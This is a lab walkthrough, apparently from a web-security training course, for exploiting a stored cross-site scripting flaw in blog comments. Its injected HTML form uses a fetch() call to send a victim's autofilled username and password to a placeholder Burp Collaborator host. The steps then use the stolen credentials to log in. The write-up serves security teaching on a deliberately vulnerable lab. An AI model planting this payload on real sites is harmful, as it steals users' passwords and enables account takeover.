## Exploiting cross-sute scripting to capture passwords

### Objective:
This lab contains a **Stored XSS** vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.

### Security Weakness:

### Exploitation Methodology:
1. Open Burp Suite Professional and navigate to the Collaborator tab.
2. Copy the unique Burp Collaborator payload to your clipboard by clicking "Copy to Clipboard."
3. Craft the following payload and insert your Burp Collaborator subdomain in the designated location:
```html
<input name="username" id="username">
<input type="password" name="password" onchange="if(this.value.length) fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
	   method: 'POST',
	   mode: 'no-cors',
	   body: username.value + ':' + this.value
});">
```
4. Understanding **`mode: 'no-cors'`**
	1. By default, when making a cross-origin request (a request to a different domain), the browser enforces the Same-Origin Policy, which restricts the request due to security reasons.
	2. the purpose of using **`mode: 'no-cors'`** is to ensure that the request is sent without being blocked by the Same-Origin Policy. The code is primarily focused on triggering the request and capturing the victim's credentials, rather than processing the response.
5. When a user views the comment, the script will trigger a POST request containing the victim's username and password to your Burp Collaborator subdomain.
6. Return to the Collaborator tab in Burp Suite and click "Poll now." You should observe an HTTP interaction. If no interactions are displayed, wait a few seconds and try again.
7. Take note of the victim's username and password in the POST body.
8. Utilize the obtained credentials to log in as the victim user.
